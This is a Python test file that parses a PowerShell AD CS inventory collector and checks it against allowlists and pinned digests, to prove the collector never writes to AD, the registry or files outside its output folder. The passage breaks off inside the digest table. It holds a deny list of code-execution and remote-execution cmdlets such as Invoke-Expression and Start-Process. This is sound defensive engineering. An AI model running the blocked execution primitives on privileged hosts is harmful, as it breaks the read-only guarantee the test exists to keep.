# ruff: noqa: E501  (the regression tables hold literal PowerShell)
"""The collector is read-only: enforced by a PowerShell AST gate in two layers.

``scripts/Export-AdcsEstate.ps1`` runs on a CA / tier-0 box with privileged
credentials, so "read-only" must be a checked property, not a comment. This
test asks pwsh to *parse* the script (``[Parser]::ParseFile`` — nothing in it
executes; see ``tests/collector/Get-ScriptInvocations.ps1``).

1. **Golden syntax tree** (completeness). ``tests/collector/collector-inventory.json``
   holds an order-preserving serialization of the WHOLE syntax tree (one line
   per node: its role in the parent, its type and every semantically relevant
   property — operators, names, string values, flags, ``#Requires``,
   attributes, every argument) plus a SHA-256 of the source text (CRLF
   normalized). ANY edit — a reorder, a changed later argument, a ``#Requires``
   line, even a comment — fails ``test_collector_matches_golden_inventory``
   until it is regenerated with ``tests/collector/regen_inventory.py`` and the
   diff is reviewed. Meta-tests prove the serializer covers every Ast type and
   property of the running PowerShell and that sampled systematic mutations
   change the tree.

2. **Semantic floor** (``violations()``). The regeneration script refuses to
   write unless this returns nothing, so a regeneration can only admit what
   these allowlists and pins admit. It is a floor, not a proof: an admitted
   edit still shows up as a golden diff a reviewer must read.

Write-capable surfaces and how the floor handles them:

* AD writes (``Set-AD*``, ``New-AD*``, ``Remove-AD*``, ``DirectoryEntry
  .CommitChanges``, ``.Properties[...].Add``, LDAP Add/Modify/Delete
  requests): not allowlisted. ``Add`` is allowed only on the collector's own
  in-memory collections (``_ADD_TARGETS``: the paged search's ``ArrayList`` of
  results and a ``SearchRequest``'s control list), and every ``.Add`` call is
  pinned with its arguments in ``PINNED_MEMBER_CALLS``.
* CA config writes: every ``certutil`` invocation must be ``certutil -getreg ...``.
* Registry writes: ``OpenSubKey`` only with the 1-argument (read-only)
  overload; WMI only as ``Get-WmiObject -Class StdRegProv -List`` + ``GetDWORDValue``.
* Remote execution (``Invoke-Command``, ``Invoke-Expression``,
  ``Start-Process``, ``& $computed``, dot-sourcing): not allowlisted; a command
  whose name is computed at runtime, or invoked with ``.``, is a violation.
* **Local file writes only into the output directory**: each write target is
  one of a fixed set of path expressions, and every variable those
  expressions read is PINNED (below). In the product, every write sink is
  preceded by ``Assert-AdcsOutputPath <target>``, which resolves the full path
  and throws unless it is inside ``$OutDir``; the ``[write-guard]`` rule
  requires that guard, on the sink's exact target, in each sink's context.
* **Every write, exec and remote operation is pinned with its control-flow
  context** (``GUARDED_OPS``): its exact text plus the enclosing functions,
  conditions, loops, try blocks and preceding early-exit guards. A duplicate,
  a guard moved after the operation, or a weakened condition changes the
  multiset and fails.
* **Exact binding pins** (``PINNED_BINDINGS``): every write root, every
  receiver of an instance-method call / property write / index write, every
  exec input, and transitively every variable their bindings read, has its
  complete binding set pinned: assignments of any operator and scope,
  ``++``/``--``, ``foreach`` variables, parameter declarations (attributes,
  type and default), call-site arguments of local functions, and property /
  index writes on the object. Any rebind is not in the set and fails.
* Refused outright: provider-drive (``${alias:x}``, ``$env:x``, ``${C:\\x}``)
  and ``$global:``/``$variable:`` assignment targets, any provider-drive
  variable reference, writes to automatic/preference variables (beyond
  ``$ErrorActionPreference = 'Stop'``), any reference to
  ``$PSDefaultParameterValues`` / ``$PSModuleAutoLoadingPreference`` /
  ``$ExecutionContext``, ``-*Variable`` common parameters (any spelling or
  computed name), splatting, destructuring, ``#Requires``, background jobs,
  ``foreach -parallel``, non-ASCII source, AST node types the collector does
  not use, and any change to the exact list of local functions.
* **Redirections**: the only ones allowed are stream merges into the
  pipeline (``ALLOWED_REDIRECTIONS``: the collector's one ``certutil -getreg
  ... 2>&1``, which is also pinned as a guarded operation); every file
  redirection, ``2>$null`` included, is refused.
* **Member dispatch through cmdlets**: ``ForEach-Object`` / ``Where-Object``
  take exactly one script block, and every allowed cmdlet has an exact
  argument vector.

PowerShell 5.1: the collector must run on Windows PowerShell 5.1, so this test
never executes it — it only parses it (here with pwsh 7). The
``collector-windows`` CI job additionally parses it with Windows PowerShell 5.1.

Out of scope: ``scripts/install-windows.ps1`` and ``scripts/uninstall-windows.ps1``
run on the *analysis* host; they never run on a CA and never touch AD CS.

Declared limits are in ``docs/threat-model.md`` ("Collector read-only gate").

``pwsh`` is required. Locally the test skips without it; under CI (``CI`` set)
a missing pwsh is a failure, not a skip.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from collections import Counter
from collections.abc import Callable, Iterable
from functools import cache
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parent.parent
COLLECTOR = ROOT / "scripts" / "Export-AdcsEstate.ps1"
DUMPER = ROOT / "tests" / "collector" / "Get-ScriptInvocations.ps1"


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only check")
        pytest.skip("pwsh not installed")
    return exe


def _run_dumper(paths: list[Path], *flags: str, timeout: int = 900) -> Any:
    out = subprocess.run(
        [
            _pwsh(),
            "-NoProfile",
            "-NonInteractive",
            "-File",
            str(DUMPER),
            *flags,
            *(str(p) for p in paths),
        ],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


# Dumps are cached by source content: one pwsh process dumps many files several
# times faster than one process per file, so the parametrized regression tests
# register their sources up front (register_sources) and the first cache miss
# dumps every registered source in batches.
_DUMP_CACHE: dict[str, dict[str, Any]] = {}
_PENDING: dict[str, bytes] = {}
_BATCH = 40


def _key(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def register_sources(texts: Iterable[str]) -> None:
    for text in texts:
        data = text.encode("utf-8")
        _PENDING.setdefault(_key(data), data)


# Parallel pwsh processes for a batch prefetch (each process dumps a chunk).
_WORKERS = max(1, min(4, (os.cpu_count() or 1)))


def _prefetch(extra: dict[str, bytes]) -> None:
    todo = {k: v for k, v in {**_PENDING, **extra}.items() if k not in _DUMP_CACHE}
    _PENDING.clear()
    if not todo:
        return
    from concurrent.futures import ThreadPoolExecutor

    with tempfile.TemporaryDirectory(prefix="adcs-gate-") as tmp:
        items = sorted(todo.items())
        size = max(1, min(_BATCH, -(-len(items) // _WORKERS)))
        chunks = [items[i : i + size] for i in range(0, len(items), size)]

        def dump_chunk(chunk: list[tuple[str, bytes]]) -> list[tuple[str, dict[str, Any]]]:
            paths = []
            for key, data in chunk:
                path = Path(tmp) / f"{key}.ps1"
                path.write_bytes(data)
                paths.append(path)
            entries = _run_dumper(paths, "-Many")
            return [(key, entry) for (key, _), entry in zip(chunk, entries, strict=True)]

        with ThreadPoolExecutor(max_workers=_WORKERS) as pool:
            for results in pool.map(dump_chunk, chunks):
                _DUMP_CACHE.update(results)


def _dump(script: Path) -> dict[str, Any]:
    data = script.read_bytes()
    key = _key(data)
    if key not in _DUMP_CACHE:
        _pwsh()
        _prefetch({key: data})
    return _DUMP_CACHE[key]


# --- the allowlist ---------------------------------------------------------------

Check = Callable[[dict[str, Any]], str | None]  # returns a violation reason or None

# A $variable name or a -parameter flag: both are case-insensitive in PowerShell.
_NAME_TOKEN = re.compile(
    r"\$\{[^}]+\}|\$[A-Za-z_][A-Za-z0-9_:]*|(?<![\w'\"-])-[A-Za-z][A-Za-z0-9]*"
)
_STRING_SPAN = re.compile(r"'[^']*'|\"[^\"]*\"")


def _canon(text: str) -> str:
    """Lower-case every $variable name and -parameter flag in *text*, leaving
    quoted strings and bareword values untouched, so an argument vector / write
    target compares case-insensitively on NAMES but exactly on VALUES."""
    out: list[str] = []
    i = 0
    for m in _STRING_SPAN.finditer(text):
        out.append(_NAME_TOKEN.sub(lambda t: t.group().lower(), text[i : m.start()]))
        out.append(m.group())
        i = m.end()
    out.append(_NAME_TOKEN.sub(lambda t: t.group().lower(), text[i:]))
    return "".join(out)


def _ok(c: dict[str, Any]) -> str | None:
    return None


def _exact(*vectors: list[str]) -> Check:
    """Allow only these exact argument vectors (parameters and values, in order)."""
    allowed = [[_canon(a) for a in v] for v in vectors]

    def check(c: dict[str, Any]) -> str | None:
        if [_canon(a) for a in c["args"]] in allowed:
            return None
        return f"arguments {c['args']} are not one of the allowed vectors {vectors}"

    return check


def _literal_here_string(c: dict[str, Any]) -> str | None:
    els = c["elements"]
    if (
        len(els) == 1
        and els[0]["parameter"] is None
        and els[0]["kind"] == "StringConstantExpressionAst"
        and els[0]["text"].startswith("@'")
    ):
        return None
    return "only one literal single-quoted here-string argument is allowed"


def _one_scriptblock(c: dict[str, Any]) -> str | None:
    els = c["elements"]
    if len(els) == 1 and els[0]["kind"] == "ScriptBlockExpressionAst":
        return None
    # -MemberName / -ArgumentList / a positional member name turn ForEach-Object
    # into a generic method dispatcher ($de | ForEach-Object -MemberName SetInfo).
    return "only a single script-block argument is allowed (no member dispatch)"


def _positional(count: int) -> Check:
    def check(c: dict[str, Any]) -> str | None:
        els = c["elements"]
        if len(els) == count and not any(e["parameter"] is not None for e in els):
            return None
        return f"exactly {count} positional argument(s) and no parameters are allowed"

    return check


# Every admitted constructor, as its EXACT argument vector (type, then the
# parenthesised constructor arguments). A type's other overloads are not
# admitted: e.g. X509Certificate2(path, password, flags) can persist a private
# key in a machine key store, but only the in-memory (,$der) form is listed.
# Each New-Object call is also a guarded operation, so its count and
# control-flow context are pinned in GUARDED_OPS.
NEW_OBJECT_VECTORS: frozenset[tuple[str, ...]] = frozenset(
    {
        # The LDAP bind credential, in memory, handed only to LdapConnection::new
        # (see SECRET_USES).
        ("System.Net.NetworkCredential", "($LdapUser, $LdapPass)"),
        # The paged search's in-memory result list.
        ("System.Collections.ArrayList",),
        # In-memory security-descriptor / certificate decoders.
        ("DirectoryServices.ActiveDirectorySecurity",),
        ("Security.AccessControl.RawSecurityDescriptor", "(@([byte[]]$bytes), 0)"),
        ("Security.Cryptography.X509Certificates.X509Certificate2", "(,$der)"),
        # Credential object for the opt-in WMI registry read.
        (
            "Management.Automation.PSCredential",
            "( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))",
        ),
        # JSON + encoding for writing the export.
        ("System.Web.Script.Serialization.JavaScriptSerializer",),
        ("Text.UTF8Encoding", "($false)"),
    }
)
_NEW_OBJECT_VECTORS_CANON = frozenset(tuple(_canon(a) for a in v) for v in NEW_OBJECT_VECTORS)


def _new_object(c: dict[str, Any]) -> str | None:
    els = c["elements"]
    if any(e["parameter"] is not None for e in els):
        return "New-Object may not take parameters (-ComObject, -TypeName, -Property, ...)"
    if tuple(_canon(a) for a in c["args"]) not in _NEW_OBJECT_VECTORS_CANON:
        return f"New-Object constructor {c['args']} is not an allowlisted exact argument vector"
    return None


_WMI_READ = ["-Namespace", "'root\\default'", "-Class", "StdRegProv", "-List"]
_WEBCFG_PARAMS = {"pspath", "filter", "name", "erroraction"}  # lower-cased by the dumper


def _web_config(c: dict[str, Any]) -> str | None:
    params = [e["parameter"] for e in c["elements"] if e["parameter"] is not None]
    if sorted(params) == sorted(_WEBCFG_PARAMS) and len(c["elements"]) == 2 * len(params):
        return None
    return f"Get-WebConfigurationProperty may only take {sorted(_WEBCFG_PARAMS)}"


ALLOWED_COMMANDS: dict[str, Check] = {
    # certutil only reads: `certutil -getreg <one key>` (the key is _certutilRead's
    # pinned parameter; every call site passes a literal key).
    "certutil": _exact(["-getreg", "$regpath"]),
    "New-Item": _exact(
        *(
            ["-ItemType", "Directory", "-Force", "-Path", p]
            for p in ("$OutDir", "$outParent", "$certDir")
        )
    ),
    "New-Object": _new_object,
    # WMI only to obtain the StdRegProv class (local, or on a DC for the opt-in
    # esc10 pass); the only methods then allowed on it are reads (GetDWORDValue).
    "Get-WmiObject": _exact(
        _WMI_READ,
        ["-ComputerName", "$dcDns", *_WMI_READ],
        ["-ComputerName", "$dcDns", "-Credential", "$dcCred", *_WMI_READ],
    ),
    # A module load is code execution: one exact form, and pinned in GUARDED_OPS.
    "Import-Module": _exact(["WebAdministration", "-ErrorAction", "Stop"]),
    # Framework assembly loads only: the JSON serializer, and the LDAP client
    # (System.DirectoryServices.Protocols; the collector builds only SearchRequests).
    "Add-Type": _exact(
        ["-AssemblyName", "System.Web.Extensions"],
        ["-AssemblyName", "System.DirectoryServices.Protocols"],
    ),
    # Read-only IIS configuration queries (ESC8 pass).
    "Get-Website": _exact(["-ErrorAction", "Stop"]),
    "Get-WebApplication": _exact(["-Site", "$site.Name", "-ErrorAction", "Stop"]),
    "Get-WebConfigurationProperty": _web_config,
    # Pipeline helpers: script blocks only (their bodies are analysed too).
    "ForEach-Object": _one_scriptblock,
    "Where-Object": _one_scriptblock,
    "Select-Object": _exact(["-First", "1"]),
    # Path / output helpers.
    "Join-Path": _positional(2),
    "Split-Path": _exact(["$outPath", "-Parent"]),
    "Test-Path": _exact(["$outParent"]),
    "Get-Date": _exact([]),
    "Out-Null": _exact([]),
    "hostname": _exact([]),
    "Write-Host": _positional(1),
    "Write-Output": _positional(1),
    "Write-Warning": _positional(1),
    # Parses the collector's own literal schema tables (a single-quoted here-
    # string: no expansion, no input): in memory only.
    "ConvertFrom-Json": _literal_here_string,
    # Builds the opt-in WMI credential in memory.
    "ConvertTo-SecureString": _exact(["$DcRegistryPass", "-AsPlainText", "-Force"]),
}

# Commands that can never be allowlisted, whatever ALLOWED_COMMANDS says: they
# rebind command resolution (aliases, functions, drives, location), write
# variables by name, run code or register engine callbacks. (Import-Module is
# the one code-load the collector needs; it has an exact vector and a pinned
# guarded operation instead.)
FORBIDDEN_COMMANDS = frozenset(
    {
        "Add-PSSnapin",
        "Clear-Item",
        "Clear-Variable",
        "Export-Alias",
        "Import-Alias",
        "Invoke-Command",
        "Invoke-Expression",
        "Invoke-Item",
        "New-Alias",
        "New-Module",
        "New-PSDrive",
        "New-Variable",
        "Pop-Location",
        "Push-Location",
        "Register-EngineEvent",
        "Register-ObjectEvent",
        "Remove-Variable",
        "Set-Alias",
        "Set-Item",
        "Set-ItemProperty",
        "Set-Location",
        "Set-PSBreakpoint",
        "Set-Variable",
        "Start-Job",
        "Start-Process",
        "Start-ThreadJob",
        "Update-FormatData",
        "Update-TypeData",
    }
)

# (static type expression, member)
ALLOWED_STATIC: set[tuple[str, str]] = {
    ("[Convert]", "FromBase64String"),
    ("[Convert]", "ToInt64"),
    ("[System.Net.Dns]", "GetHostEntry"),
    ("[IO.File]", "WriteAllText"),
    ("[IO.File]", "WriteAllBytes"),
    ("[int]", "TryParse"),  # schema type check (the [ref] target is pinned)
    # Assert-AdcsOutputPath (the write-path guard): path arithmetic and
    # existence / attribute reads only.
    ("[IO.Path]", "GetFullPath"),
    ("[IO.Path]", "GetDirectoryName"),
    ("[IO.Directory]", "Exists"),
    ("[IO.File]", "Exists"),
    ("[IO.File]", "GetAttributes"),
    # System.DirectoryServices.Protocols, read side only. The identifier
    # locates a DC; the connection binds; SearchRequest is the ONLY request type
    # (ModifyRequest / AddRequest / DeleteRequest / ModifyDNRequest /
    # ExtendedRequest are never allowlisted, see _NEVER_TYPES); the two controls
    # page a search and ask for the DACL+Owner of nTSecurityDescriptor.
    ("[System.DirectoryServices.Protocols.LdapDirectoryIdentifier]", "new"),
    ("[System.DirectoryServices.Protocols.LdapConnection]", "new"),
    ("[System.DirectoryServices.Protocols.SearchRequest]", "new"),
    ("[System.DirectoryServices.Protocols.PageResultRequestControl]", "new"),
    ("[System.DirectoryServices.Protocols.SecurityDescriptorFlagControl]", "new"),
}
# Every allowed WriteAll* call writes into the output directory.
ALLOWED_WRITE_TARGETS = {
    "WriteAllText": {"$outPath"},
    "WriteAllBytes": {"(Join-Path $certDir $certFile)", "(Join-Path $certDir $crlFile)"},
}
# Property / indexer ASSIGNMENTS are object writes. The only ones allowed are
# the collector's existing configuration of query/serialiser objects and its
# own local hashtables, each tied to the receiver's binding (provenance) in the
# same scope. Anything else — in particular any assignment on a
# directory-services entry, or to a `.Value` — is rejected. (The receivers are
# also PINNED below, so their bindings are exact.)
_SERIALISER = re.compile(r"New-Object System\.Web\.Script\.Serialization\.JavaScriptSerializer")
_LDAP_CONNECTION = re.compile(
    r"\[System\.DirectoryServices\.Protocols\.LdapConnection\]::new\(\$id(, \$cred)?\)"
)
_PAGE_CONTROL = re.compile(
    r"\[System\.DirectoryServices\.Protocols\.PageResultRequestControl\]::new\(500\)"
)
# A hashtable literal: an in-memory table the collector builds itself.
_LOCAL_TABLE = re.compile(r"(\[ordered\])?@\{.*\}")
MEMBER_ASSIGNMENTS_ALLOWED: dict[tuple[str, str], re.Pattern[str]] = {
    ("js", "maxjsonlength"): _SERIALISER,
    # Client-side settings of the local LDAP connection object (no LDAP traffic).
    ("conn", "authtype"): _LDAP_CONNECTION,
    # The paging cookie of the local request control (the server's own cookie).
    ("page", "cookie"): _PAGE_CONTROL,
}
# The only nested property write: the connection's LDAP protocol version.
NESTED_MEMBER_ASSIGNMENTS_ALLOWED: dict[tuple[str, str], re.Pattern[str]] = {
    ("conn", "sessionoptions.protocolversion"): _LDAP_CONNECTION,
}
INDEX_ASSIGNMENTS_ALLOWED: dict[str, re.Pattern[str]] = {
    "casecurity": _LOCAL_TABLE,
    "enrollmentservices": _LOCAL_TABLE,
    # Local [ordered]@{} of per-container enumeration completion markers.
    "enumeration": _LOCAL_TABLE,
    # _entryProps' attribute table and a marker's reason field (local tables).
    "p": _LOCAL_TABLE,
    "m": _LOCAL_TABLE,
    # The local CA's registry ACEs, keyed by CA name.
    "localsecurity": _LOCAL_TABLE,
}
_DIRECTORY_SOURCES = re.compile(
    r"DirectoryServices\.DirectoryEntry|_ldapEntry|_ldapRoot|_ldapRootDse|\[ADSI\]",
    re.IGNORECASE,
)
_SCRIPT = "<script>"


def _receiver_bindings(dump: dict[str, Any], root: str, scope: str) -> list[str]:
    """Values bound to *root* in *scope* (or the script scope if none there)."""
    local = [b["value"] for b in dump["bindings"] if b["variable"] == root and b["scope"] == scope]
    if local:
        return local
    return [b["value"] for b in dump["bindings"] if b["variable"] == root and b["scope"] == _SCRIPT]


def _member_assignment_violations(dump: dict[str, Any]) -> list[str]:
    out: list[str] = []
    for m in dump.get("member_assignments", []):
        where = f"[member-assign] {m['scope']}: {m['target']} {m['operator']} ..."
        root = m["receiver_root"]
        target = m["target"].lower()
        if target.endswith(".value"):
            out.append(f"{where}: assignment to .Value is rejected")
            continue
        values = _receiver_bindings(dump, root, m["scope"]) if root else []
        if any(_DIRECTORY_SOURCES.search(v) for v in values):
            out.append(f"{where}: assignment on a directory-services object is rejected")
            continue
        if m["kind"] == "member":
            member = target.rsplit(".", 1)[-1]
            pattern = MEMBER_ASSIGNMENTS_ALLOWED.get((root or "", member))
            path = target.split(".", 1)[-1]
            if "." in path or "[" in target:
                # nested targets ($x.A.B = ...) only where explicitly listed
                pattern = NESTED_MEMBER_ASSIGNMENTS_ALLOWED.get((root or "", path))
        else:
            pattern = INDEX_ASSIGNMENTS_ALLOWED.get(root or "")
            if target.count("[") != 1:
                pattern = None
        if pattern is None:
            out.append(f"{where}: property/indexer assignment is not allowlisted")
        elif not values or not all(pattern.fullmatch(v) for v in values):
            out.append(f"{where}: receiver ${root} is not bound to an allowed object ({values})")
    return out


# Automatic variables a member call may use as its receiver without a binding.
_AUTOMATIC_RECEIVERS = {"_", "matches"}
_SAFE_OUTPUT_NAME = re.compile(r"'(?:[A-Za-z0-9_-]+/)?[A-Za-z0-9_-]+\.json'")
# The only redirection: certutil's stderr discarded.
# certutil's stderr merged into its output (2>&1) so the exit code and message
# are captured; it writes no file. No file redirection is allowed.
ALLOWED_REDIRECTIONS = {("MergingRedirectionAst", "Error", None, None)}


def _open_sub_key(m: dict[str, Any]) -> str | None:
    return None if m["argc"] == 1 else "OpenSubKey must use the read-only (1-argument) overload"


# Add only on the collector's own in-memory collections: the paged search's
# result list and a SearchRequest's control list.
_ADD_TARGETS = {"$entries", "$req.Controls"}


def _add_target(m: dict[str, Any]) -> str | None:
    if _canon(m["target"]) in {_canon(t) for t in _ADD_TARGETS}:
        return None
    return f"Add is allowed only on {sorted(_ADD_TARGETS)}"


ALLOWED_INSTANCE: dict[str, Check] = {
    # string / collection helpers
    "ToLower": _ok,
    "Trim": _ok,
    "TrimStart": _ok,
    "StartsWith": _ok,
    "ToString": _ok,
    "ToUniversalTime": _ok,
    "GetString": _ok,
    "GetEnumerator": _ok,
    "ContainsKey": _ok,
    "Serialize": _ok,  # JavaScriptSerializer -> JSON text
    "TrimEnd": _ok,  # string helpers of the write-path guard
    "Equals": _ok,
    # LDAP (System.DirectoryServices.Protocols): Bind authenticates the local
    # connection; SendRequest transmits the request it is given, and its one
    # argument is binding-pinned to a SearchRequest; GetValues reads a returned
    # attribute's values. GetNewClosure captures the search scriptblock.
    "Bind": _ok,
    "SendRequest": _ok,
    "GetValues": _ok,
    "GetNewClosure": _ok,
    "Add": _add_target,
    # In-memory security-descriptor decoding (ActiveDirectorySecurity object
    # built by New-Object; nothing is written back to AD).
    "SetSecurityDescriptorBinaryForm": _ok,
    "GetAccessRules": _ok,
    "GetOwner": _ok,
    "Translate": _ok,  # SID <-> NTAccount name lookup
    # Local registry read (CA\Security) and WMI StdRegProv read (DC values).
    "OpenSubKey": _open_sub_key,
    "GetValue": _ok,
    "GetDWORDValue": _ok,
}

ALLOWED_STATIC_TYPES = {
    "bool",
    "byte[]",
    "int",
    "string",
    "switch",
    "uint32",
    "void",
    "ordered",
    "Convert",
    "IO.File",
    "System.Net.Dns",
    "Text.Encoding",
    "Microsoft.Win32.Registry",
    "Security.Principal.NTAccount",
    "Security.Principal.SecurityIdentifier",
    # The write-path guard: path / comparison / attribute types.
    "char",
    "IO.Path",
    "IO.Directory",
    "IO.FileAttributes",
    "StringComparison",
    # Parameter type constraints of local helpers.
    "string[]",
    "scriptblock",  # [scriptblock]$send / $read parameters (::Create is not allowlisted)
    "ref",  # only in the pinned [int]::TryParse($values[0], [ref]$n)
    # System.DirectoryServices.Protocols, read side (see ALLOWED_STATIC).
    "System.DirectoryServices.Protocols.AuthType",
    "System.DirectoryServices.Protocols.LdapConnection",
    "System.DirectoryServices.Protocols.LdapDirectoryIdentifier",
    "System.DirectoryServices.Protocols.PageResultRequestControl",
    "System.DirectoryServices.Protocols.SearchRequest",
    "System.DirectoryServices.Protocols.SearchScope",
    "System.DirectoryServices.Protocols.SecurityDescriptorFlagControl",
    "System.DirectoryServices.Protocols.SecurityMasks",
}
# LDAP write / server-side operations and other non-read transports: never
# admitted, whatever the allowlists say (test_never_types_are_never_allowlisted).
_NEVER_TYPES = re.compile(
    r"(ModifyRequest|AddRequest|DeleteRequest|ModifyDNRequest|ExtendedRequest|"
    r"DsmlSoapHttpConnection|DsmlRequestDocument|CompareRequest|DirectoryEntry)$",
    re.IGNORECASE,
)

# --- closed sets (strict default: what cannot be positively pinned is refused) -----

# AST node types the collector may contain: exactly the ones it uses today.
# Classes/enums, DSC configurations, dynamic keywords, data sections, traps,
# `$using:`, pipeline chains (&&/||), ternaries, do/while/for loops and
# parse-error nodes are all refused rather than reasoned about.
ALLOWED_NODE_TYPES = frozenset(
    {
        "ArrayExpressionAst",
        "ArrayLiteralAst",
        "AssignmentStatementAst",
        "AttributeAst",
        "BinaryExpressionAst",
        "BreakStatementAst",
        "CatchClauseAst",
        "CommandAst",
        "CommandExpressionAst",
        "CommandParameterAst",
        "ConstantExpressionAst",
        "ContinueStatementAst",
        "ConvertExpressionAst",
        "ExpandableStringExpressionAst",
        "ForEachStatementAst",
        "ForStatementAst",
        "FunctionDefinitionAst",
        "HashtableAst",
        "IfStatementAst",
        "IndexExpressionAst",
        "InvokeMemberExpressionAst",
        "MemberExpressionAst",
        "MergingRedirectionAst",
        "NamedAttributeArgumentAst",
        "NamedBlockAst",
        "ParamBlockAst",
        "ParameterAst",
        "ParenExpressionAst",
        "PipelineAst",
        "ReturnStatementAst",
        "ScriptBlockAst",
        "ScriptBlockExpressionAst",
        "StatementBlockAst",
        "StringConstantExpressionAst",
        "SubExpressionAst",
        "SwitchStatementAst",
        "ThrowStatementAst",
        "TryStatementAst",
        "TypeConstraintAst",
        "TypeExpressionAst",
        "UnaryExpressionAst",
        "VariableExpressionAst",
    }
)

# The exact functions the collector defines, in source order. A redefinition
# (a second `function _safeFileName`), a new helper, or a function shadowing an
# allowlisted cmdlet is not this tuple.
LOCAL_FUNCTIONS: tuple[str, ...] = (
    "_b64",
    "_guidHex",
    "_sidString",
    "_ldapEscape",
    "Assert-AdcsOutputPath",
    "_writeJson",
    "_pagedSearchCore",
    "_baseSearchCore",
    "_entryProps",
    "_v",
    "_ldapConnection",
    "_search",
    "_rootDse",
    "_list",
    "_schemaCheck",
    "_requireSchema",
    "_searchMarker",
    "_decode",
    "_decodeBinding",
    "_parseCertutilFlagLines",
    "_parseCertutilDwordLines",
    "_parseCertutilMultiSzLines",
    "_oidValues",
    "_certutilStatus",
    "_certutilFlagsFrom",
    "_certutilDwordFrom",
    "_auditFilterFrom",
    "_certutilMultiSzFrom",
    "_certutilStringFrom",
    "_wmiDwordStatus",
    "_tryRead",
    "_epaToken",
    "_classifyApp",
    "_caKindFromType",
    "_safeFileName",
    "_certKindFromDer",
    "_parseAces",
    "_sdRead",
    "_aclRow",
    "_caHostSid",
    "_objAcl",
    "_childAcls",
    "_readOwner",
    "_caSecurityFromBytes",
    "_rawSdOwner",
    "_caSecurityRead",
    "_certutilRead",
    "_certutilFlags",
    "_certutilDword",
    "_certutilMultiSz",
    "_mark",
    "_markSearch",
    "_localCaRow",
)

# Structural-closure pins: the digest of the normalized AST subtree of EVERY
# statement of the collector (each top-level statement and each statement inside
# every function / scriptblock body), keyed by its structural index path (see
# _statement_digests). HAND-MAINTAINED and never written by regen_inventory.py
# (test_regen_does_not_touch_pin_tables), so ANY edit anywhere -- a changed
# string, a new statement, a reorder -- fails the semantic floor until a human
# updates this table; print_pin_candidates.py prints the candidates. A function
# definition is itself a statement, so this subsumes the former
# LOCAL_FUNCTION_BODIES. The semantic checks above remain the floor for a harmful
# edit made by someone who does update the digests.
STATEMENT_DIGESTS: dict[str, str] = {
    "0.1.0": "4fbc2be395306a6ec8b4282e2d60450b6a7d3b24f40585523b206be47d1ab1a6",  # AssignmentStatementAst
    "0.1.1": "2814729439da353d1eb4d1a65e14ebfb4e6ddda2768f059d4ae5d84e0c581e1d",  # AssignmentStatementAst
    "0.1.2": "49b00bcb38f3c824c5d8688ac77386c4965f47bb0aedcd8dc2bca944ecda5536",  # FunctionDefinitionAst
    "0.1.2.1.0.0": "b0bfbd94546c89400b1af0293ef422a27650d212a82ba56351a60bfd2814382e",  # PipelineAst
    "0.1.3": "b3b801bf40104c7fb858531280ce6b2b0c9b34369d2684feb75a48a59d0dd35e",  # FunctionDefinitionAst
    "0.1.3.1.0.0": "d79e48398ed0962ead1ef868305f06b587289c598b43d2817aecdfff46c334da",  # IfStatementAst
    "0.1.3.1.0.0.1.0": "0f1c5e2054b9780de87535dd47d4e921576f9b3ba57e9f0c47c66374e148f982",  # ReturnStatementAst
    "0.1.3.1.0.1": "7689cd73d6a9e57fcac7dba259748a79f55f8fdff46fd71d363addb329bfcf93",  # AssignmentStatementAst
    "0.1.3.1.0.2": "2e8799c3b0206f61d379144819f4f7642d798d46d0ecc95ed8645e5a1a958697",  # IfStatementAst
    "0.1.3.1.0.2.1.0": "57e6daf90a2713135839508c8dd45d42a6d27a63f0960af06102bf9e41413758",  # ReturnStatementAst
    "0.1.3.1.0.3": "875280a27059f597f8f409a7541751fd892ef7b9c7352c19c158242f1eddc128",  # PipelineAst
    "0.1.3.1.0.3.0.0.0.0.0.0.0.1.1.0.0.0": "1c4c0b4c2db3270bdf0167f5edd566d9cdabc5487494124078f8e5f9ce5a0546",  # PipelineAst
    "0.1.4": "04f091540a4cf2674f41950b5ddb1adcd6b1b85fab7f8f92b1573012a67cc9ee",  # FunctionDefinitionAst
    "0.1.4.1.0.0": "cd20e911af144b15e5b42e109e577a7cb82f6abe29a119aa0b8d8af404d505a3",  # IfStatementAst
    "0.1.4.1.0.0.0.0.0.0.0.0.0.0": "b504ed6112c27fd375a659889b7c28dfe3b4d079510f39a288bca10f6389d182",  # PipelineAst
    "0.1.4.1.0.0.0.0.0.1.0.0.0.0.0.0.0.0": "258c429c9a6be359daba13cf273f22b8587c92729978a380052f6e68328a77bc",  # PipelineAst
    "0.1.4.1.0.0.1.0": "f569bb151681f1046e22402eff1640fc84bc21c6a597c8dca3eae87505daa1a4",  # ReturnStatementAst
    "0.1.4.1.0.1": "18896f2023414eb5ae1b695cc5a5daa2f2242e5d5b6c4a3faab2151f0403bc31",  # AssignmentStatementAst
    "0.1.4.1.0.1.1.0.1.0.0.0": "395911dc50f7c75e6a5678bc0a64e8a5f6bc62954ef4cb3c8ba785f8d4b8672b",  # PipelineAst
    "0.1.4.1.0.2": "499f706d3b1dd768d038c584285c47b7733ec08da2cd6b60d8b10768e0640134",  # IfStatementAst
    "0.1.4.1.0.2.1.0": "1a7b656edadd54310a81938a1335f97b076587ceff8bd0a579c63142a4e5a559",  # ReturnStatementAst
    "0.1.4.1.0.3": "39229b5aa4c9d246a220e11ce60757aba746426b5749ee1e2f0a19d934b3ee62",  # AssignmentStatementAst
    "0.1.4.1.0.3.1.0.0.0": "4a97e49e9228cc8612cfab37b56782c7afa974e6e16b150592a451de9f6bded3",  # PipelineAst
    "0.1.4.1.0.4": "9dd9bca1de892404581de772af7cc0414d09216fc34dbbe7bed4bc114db4f906",  # ForStatementAst
    "0.1.4.1.0.4.3.0": "c942f4fb109e55b356cf235ed2ca12443b430c6d0f63a27baac5d65386db2e88",  # AssignmentStatementAst
    "0.1.4.1.0.5": "7340119fee0edbea8096518240b79c60ba3e05be7d815e42af0a60f166566b17",  # PipelineAst
